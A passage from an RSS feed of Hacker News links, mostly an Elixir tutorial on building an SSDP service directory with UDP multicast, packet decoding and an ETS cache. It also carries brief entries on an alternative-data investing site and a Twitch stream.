    GenServer.cast(channel, {:broadcast, packet})
  end

  @spec init(:ok) :: {:ok, %{socket: port}}
  def init(:ok) do
    udp_options = [
      :binary,
      active: true,
      add_membership: {@multicast_group, {0, 0, 0, 0}},
      multicast_if: {0, 0, 0, 0},
      multicast_loop: false,
      reuseaddr: true
    ]

    {:ok, socket} = :gen_udp.open(@multicast_port, udp_options)

    {:ok, %{socket: socket}}
  end

  def handle_cast({:broadcast, packet}, state) do
    :ok = :gen_udp.send(state.socket, @multicast_group, @multicast_port, packet)

    {:noreply, state}
  end

  def handle_info({:udp, _socket, _ip, _port, data}, state) do
    Task.Supervisor.start_child(SSDPDirectory.DecodingSupervisor, fn -&gt;
      with {:ok, packet, rest} &lt;- :erlang.decode_packet(:http_bin, data, []),
           {:ok, handler} &lt;- packet_handler(packet),
           {:ok, decoded} &lt;- handler.decode(rest) do
        :ok = handler.handle(decoded)
      end
    end)

    {:noreply, state}
  end

  defp packet_handler({:http_request, "NOTIFY", _target, _version}),
    do: {:ok, Presence}

  defp packet_handler({:http_response, _version, 200, "OK"}),
    do: {:ok, Discovery.Response}

  defp packet_handler(_packet), do: :error
end</code></pre>
<p>Most of the magic happens in the <code>init/1</code> function. By opening a UDP socket and joining it to the protocol’s multicast group, our process is now able to receive packets that are broadcast to that group. That receiving logic is located in the <code>handle_info/2</code> function within the same file.</p>
<p>When receiving a packet, we spawn another process that is responsible for handling that packet. This process runs under a <code>Task.Supervisor</code> in order to isolate crashes of that process from the <code>MulticastChannel</code>. Also interesting, is that we’re able to decode the incoming packets using <a href="http://erlang.org/doc/man/erlang.html#decode_packet-3">:erlang.decode_packet/3</a>. This is a builtin function that allows us to decode a variety of packet formats, piece-by-piece. In this case, we’re using it to parse the packet as an HTTP packet. This is the same way that Elixir’s <a href="https://github.com/elixir-mint/mint/blob/master/lib/mint/http1/response.ex#L7">Mint</a> decodes HTTP responses too!</p>
<p>Based on the type of packet decoded, <code>packet_handler/1</code> then delegates the handling of that packet to another module. Either we’ve received an HTTP NOTIFY request, and we’re dealing with a <a href="https://github.com/QuinnWilton/ssdp_directory/blob/master/lib/ssdp_directory/presence.ex">presence notification</a>, or we’ve received a <a href="https://github.com/QuinnWilton/ssdp_directory/blob/master/lib/ssdp_directory/discovery/response.ex">response to a discovery request</a>.</p>
<p>Let’s take a look at the presence case. In case you’re curious, here’s an example presence notification:</p>
<pre><code>NOTIFY * HTTP/1.1
Host: 239.255.255.250:reservedSSDPport
NT: blenderassociation:blender
NTS: ssdp:alive
USN: someunique:idscheme3
AL: &lt;blender:ixl&gt;&lt;http://foo/bar&gt;
Cache-Control: max-age = 7393</code></pre>
<p>And here’s where we handle it:</p>
<pre><code>defmodule SSDPDirectory.Presence do
  require Logger

  alias __MODULE__
  alias SSDPDirectory.HTTP

  @type command :: Presence.Alive.t() | Presence.ByeBye.t()

  @spec decode(binary) ::
          :error
          | {:ok, command}
  def decode(data) do
    case HTTP.decode_headers(data, []) do
      {:ok, headers, _rest} -&gt;
        process_headers(headers)

      :error -&gt;
        _ = Logger.debug(fn -&gt; "Failed to decode NOTIFY request: " &lt;&gt; inspect(data) end)

        :error
    end
  end

  @spec handle(command) :: :ok
  def handle(%Presence.Alive{} = command) do
    Presence.Alive.handle(command)
  end

  def handle(%Presence.ByeBye{} = command) do
    Presence.ByeBye.handle(command)
  end

  defp process_headers(headers) do
    do_process_headers(headers, %{})
  end

  defp do_process_headers([], args) do
    case args do
      %{command: "ssdp:alive", usn: usn, type: type}
      when not is_nil(usn) and not is_nil(type) -&gt;
        {:ok,
         %Presence.Alive{
           usn: usn,
           type: type,
           location: Map.get(args, :location)
         }}

      %{command: "ssdp:byebye", usn: usn, type: type}
      when not is_nil(usn) and not is_nil(type) -&gt;
        {:ok,
         %Presence.ByeBye{
           usn: usn,
           type: type
         }}

      _ -&gt;
        :error
    end
  end

  defp do_process_headers([{"nts", command} | rest], args) do
    args = Map.put(args, :command, command)

    do_process_headers(rest, args)
  end

  defp do_process_headers([{"nt", type} | rest], args) do
    args = Map.put(args, :type, type)

    do_process_headers(rest, args)
  end

  defp do_process_headers([{"usn", usn} | rest], args) do
    args = Map.put(args, :usn, usn)

    do_process_headers(rest, args)
  end

  defp do_process_headers([{"al", location} | rest], args) do
    args = Map.put(args, :location, location)

    do_process_headers(rest, args)
  end

  defp do_process_headers([{"location", location} | rest], args) do
    args = Map.put(args, :location, location)

    do_process_headers(rest, args)
  end

  defp do_process_headers([_ | rest], args) do
    do_process_headers(rest, args)
  end
end</code></pre>
<p>It looks like there’s a lot going on here, but it’s actually pretty simple. Starting in <code>decode/1</code>, we continue decoding the packet from <code>MulticastChannel</code>. This time it’s the headers we’re interested in, so we decode those, and then process them in order to determine what kind of command we’re dealing with.</p>
<p>The processing step simply involves recursing over the list of headers, and accumulating the relevant ones in a map . Once we’ve done that, we just construct the corresponding command!</p>
<p>Lastly, the command handler delegates to a third module based on the type of command being processed. For example, in the case of an <a href="https://github.com/QuinnWilton/ssdp_directory/blob/master/lib/ssdp_directory/presence/alive.ex">ssdp:alive</a> command:</p>
<pre><code>defmodule SSDPDirectory.Presence.Alive do
  require Logger

  alias __MODULE__

  alias SSDPDirectory.{
    Cache,
    Service
  }

  @enforce_keys [:usn, :type]
  defstruct [:location] ++ @enforce_keys

  @type t :: %Alive{}

  @spec handle(Alive.t()) :: :ok
  def handle(%Alive{} = command) do
    _ = Logger.debug(fn -&gt; "Handling ssdp:alive request: " &lt;&gt; inspect(command) end)

    service = %Service{
      usn: command.usn,
      type: command.type,
      location: command.location
    }

    :ok = Cache.insert(service)
  end
end</code></pre>
<p>Here we just construct a service using the parameters in the command, and then store it in our <a href="https://github.com/QuinnWilton/ssdp_directory/blob/master/lib/ssdp_directory/cache.ex">cache</a>:</p>
<pre><code>defmodule SSDPDirectory.Cache do
  use GenServer

  require Logger

  alias __MODULE__
  alias SSDPDirectory.Service

  def start_link(opts \\ []) do
    GenServer.start_link(Cache, :ok, opts)
  end

  def contents(cache \\ Cache) do
    :ets.tab2list(cache)
    |&gt; Enum.into(%{})
  end

  def insert(cache \\ Cache, %Service{} = service) do
    GenServer.call(cache, {:insert, service})
  end

  def delete(cache \\ Cache, %Service{} = service) do
    GenServer.call(cache, {:delete, service})
  end

  def flush(cache \\ Cache) do
    GenServer.call(cache, :flush)
  end

  def init(:ok) do
    table = :ets.new(Cache, [:named_table, read_concurrency: true])

    {:ok, %{table: table}}
  end

  def handle_call({:insert, %Service{usn: usn} = service}, _from, data) when not is_nil(usn) do
    :ets.insert(data.table, {usn, service})

    _ = Logger.debug(fn -&gt; "Cached service: " &lt;&gt; inspect(usn) end)

    {:reply, :ok, data}
  end

  def handle_call({:delete, %Service{usn: usn}}, _from, data) when not is_nil(usn) do
    :ets.delete(data.table, usn)

    _ = Logger.debug(fn -&gt; "Evicted service: " &lt;&gt; inspect(usn) end)

    {:reply, :ok, data}
  end

  def handle_call(:flush, _from, data) do
    :ets.delete_all_objects(data.table)

    _ = Logger.debug(fn -&gt; …</code></pre></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://quinnwilton.com/blog/writing-an-ssdp-directory-in-elixir">https://quinnwilton.com/blog/writing-an-ssdp-directory-in-elixir</a></em></p>]]>
            </description>
            <link>https://quinnwilton.com/blog/writing-an-ssdp-directory-in-elixir</link>
            <guid isPermaLink="false">hacker-news-small-sites-24256984</guid>
            <pubDate>Mon, 24 Aug 2020 02:09:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alternative Data]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24256644">thread link</a>) | @jppope
<br/>
August 23, 2020 | https://www.quiverquant.com/splash/ | <a href="https://web.archive.org/web/*/https://www.quiverquant.com/splash/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        <h3><span>What is alternative data?</span></h3>
                        <h3><span>Alternative data refers to non-traditional data sources that can be used for stock analysis. Alternative data includes things like social media trends and web traffic data (and not anything that can be found on an income statement or balance sheet).</span>
			<p>
                        <span><span>Over the last decade, alternative data has exploded in popularity among hedge funds and Wall Street trading firms.</span> Professional investors spent almost $2B on alternative data in 2020. This data allows them to find unique insights on stocks, and gain an information edge over the rest of the market.</span>
			<br>
			<img src="https://www.quiverquant.com/static/images/alt_spending.png">
                        <span><span>However, alternative data is still almost completely inaccessible to non-professional investors.</span> Most providers charge thousands of dollars a year for access to their services, and in many cases only sell to institutional clients.</span>
			<br>
			<img src="https://www.quiverquant.com/static/images/alt_cost.png">
                        <span><span>We created this site to level the playing field between retail investors and Wall Street,</span> by providing high-quality alternative data on a free, easy-to-use platform.</span></p></h3>
                </div></div>]]>
            </description>
            <link>https://www.quiverquant.com/splash/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24256644</guid>
            <pubDate>Mon, 24 Aug 2020 00:50:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a startup from $0 to $1 – Day 5: Build part 2]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24256410">thread link</a>) | @branzzel
<br/>
August 23, 2020 | https://www.twitch.tv/branzzel | <a href="https://web.archive.org/web/*/https://www.twitch.tv/branzzel">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.twitch.tv/branzzel</link>
            <guid isPermaLink="false">hacker-news-small-sites-24256410</guid>
            <pubDate>Mon, 24 Aug 2020 00:09:38 GMT</pubDate>
        </item>
    </channel>
</rss>
